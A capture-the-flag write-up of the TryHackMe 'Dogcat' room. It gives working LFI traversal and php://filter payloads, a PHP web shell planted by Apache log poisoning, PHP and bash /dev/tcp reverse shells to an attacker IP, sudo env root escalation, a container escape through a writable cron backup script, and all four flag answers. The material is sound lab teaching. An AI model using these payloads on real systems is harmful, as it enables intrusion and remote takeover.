# TryHackMe - Dogcat Writeup

## Recon

Started with an nmap scan against the target.

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/tomcat]
└─$ nmap -Pn -sS -sV -sC -A -T4 10.49.132.219    
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: dogcat
```

Two ports open, SSH and HTTP. The web page is called "dogcat" — a gallery site that lets you pick a dog or a cat.

Ran gobuster against it to see what directories exist:

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/tomcat]
└─$ gobuster dir -u http://10.49.132.219 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
cats                 (Status: 301) [Size: 313] [--> http://10.49.132.219/cats/]
dogs                 (Status: 301) [Size: 313] [--> http://10.49.132.219/dogs/]
server-status        (Status: 403) [Size: 278]
```

Nothing too exciting — just the cats/dogs image folders and a locked-down server-status.

## Finding the LFI

The site takes a `?view=` parameter (`?view=dog` / `?view=cat`) to decide which gallery to load, which immediately screams LFI. I used the `php://filter` wrapper to read the source of `index.php` instead of letting it execute:

```
http://10.49.132.219/?view=php://filter/convert.base64-encode/resource=dog/../../../../../var/www/html/index
```

Base64-decoded the response and got the page source. The relevant part:

```php
function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}

$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
if(isset($_GET['view'])) {
    if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
        echo 'Here you go!';
        include $_GET['view'] . $ext;
    } else {
        echo 'Sorry, only dogs or cats are allowed.';
    }
}
```

So the check is just a `strpos` for the substring "dog" or "cat" anywhere in the `view` parameter — it doesn't actually validate a path. It then includes `$_GET['view'] . $ext`, and `ext` defaults to `.php` but is fully user-controlled. That's a filter bypass and an LFI with extension control rolled into one.

Confirmed arbitrary file read by pulling `/etc/passwd`:

```
http://10.49.132.219/?view=dog/../../../../../etc/passwd&ext=
```

By setting `ext=` empty and prefixing the traversal with the word "dog" to pass the `containsStr` check, I could read any file on the box.

## LFI to RCE via log poisoning

Since Apache logs the User-Agent header, and the LFI lets me include arbitrary files (with a controllable extension), the classic move is log poisoning: put PHP code in the User-Agent, then include the Apache access log so it gets executed.

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/tomcat]
└─$ curl -A "<?php system(\$_GET['cmd']); ?>" "http://10.49.158.24/"
<!DOCTYPE HTML>
<html>
...
```

Then included the access log through the LFI:

```
http://10.49.158.24/?view=dog/../../../../../var/log/apache2/access.log&ext=&cmd=id
```

Got code execution back through the poisoned log:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Getting a shell

Used the RCE to pop a reverse shell:

```
php -r '$sock=fsockopen("192.168.144.158",4445);exec("sh <&3 >&3 2>&3");'
```

URL-encoded and dropped in as `cmd`, caught it on a listener:

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/tomcat]
└─$ nc -nvlp 4445
listening on [any] 4445 ...
connect to [192.168.144.158] from (UNKNOWN) [10.49.158.24] 60914
whoami
www-data
```

Stabilized with `/bin/bash -i`.

**Flag 1** — sitting right in the web root:

```
www-data@7774c073affe:/var/www/html$ cat flag.php
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>
```

**Flag 2** — found by searching for it:

```
www-data@7774c073affe:/var/www/html$ find / -type f -name "*flag2*" 2>/dev/null
/var/www/flag2_QMW7JvaY2LvK.txt
www-data@7774c073affe:/var/www/html$ cat /var/www/flag2_QMW7JvaY2LvK.txt
THM{LF1_t0_RC3_aec3fb}
```

## Privesc to root (inside the container)

Checked sudo rights as www-data:

```
www-data@7774c073affe:/var/www/html$ sudo -l
User www-data may run the following commands on 7774c073affe:
    (root) NOPASSWD: /usr/bin/env
```

`env` is a well-known GTFOBins entry for privilege escalation — it can be used to spawn a shell with root's environment:

```
www-data@7774c073affe:/var/www/html$ sudo env /bin/sh
whoami
root
```

**Flag 3** — in root's home directory inside the container:

```
root@7774c073affe:~# cat flag3.txt
THM{D1ff3r3nt_3nv1ronments_874112}
```

## Container escape

At this point I'm root, but only root inside a Docker container — the flag name is a pretty big hint that there's more environments to jump between. Time to enumerate the container itself.

Set up a python webserver locally to serve deepce (https://github.com/stealthcopter/deepce):

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/tomcat]
└─$ python3 -m http.server 9090
Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
```

Pulled and ran it on the target:

```
root@7774c073affe:/tmp# curl -sL http://192.168.144.158:9090/deepce.sh -o deepce.sh
root@7774c073affe:/tmp# chmod +x deepce.sh
root@7774c073affe:/tmp# ./deepce.sh
```

The interesting bit out of the whole enumeration was the mounts section:

```
[+] Other mounts .............. Yes
/root/container/backup /opt/backups rw,relatime - ext4 /dev/nvme1n1p2 rw,data=ordered
```

`/opt/backups` inside the container maps to `/root/container/backup` on the host — and it's mounted read-write. Checked what's in there:

```
root@7774c073affe:/opt/backups# ls -al
-rwxr--r-- 1 root root      69 Mar 10  2020 backup.sh
-rw-r--r-- 1 root root 2949120 Sep 23 13:30 backup.tar
root@7774c073affe:/opt/backups# cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

So there's a `backup.sh` on the host that presumably runs on a schedule (cron on the host), and since the mount is writable from inside the container, I can append a reverse shell payload to it and wait for the host to execute it as root:

```
root@7774c073affe:/opt/backups# echo "bash -i >& /dev/tcp/192.168.144.158/9999 0>&1" >> backup.sh
root@7774c073affe:/opt/backups# cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
bash -i >& /dev/tcp/192.168.144.158/9999 0>&1
```

Set up a listener and waited for the cron job on the host to trigger:

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/tomcat]
└─$ nc -nvlp 9999
listening on [any] 9999 ...
connect to [192.168.144.158] from (UNKNOWN) [10.49.158.24] 59184
bash: cannot set terminal process group (3180): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# ls
container
flag4.txt
root@dogcat:~# cat flag4.txt
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
```

Root on the actual host — full container escape via the writable backup mount.

## Summary

- **LFI**: `?view=` parameter only checked for the substring "dog"/"cat", allowing path traversal + `php://filter` wrapper for arbitrary file read.
- **RCE**: Log poisoning — injected PHP into the User-Agent header, then included `access.log` through the LFI to execute it.
- **Privesc (container)**: `sudo` NOPASSWD on `/usr/bin/env` → GTFOBins → root inside the container.
- **Container escape**: A host-side backup script was reachable through a writable bind mount (`/opt/backups` → host `/root/container/backup`), appended a reverse shell payload, waited for the host cron to fire it → root on the host.

**Flags:**
1. `THM{Th1s_1s_N0t_4_Catdog_ab67edfa}`
2. `THM{LF1_t0_RC3_aec3fb}`
3. `THM{D1ff3r3nt_3nv1ronments_874112}`
4. `THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}`
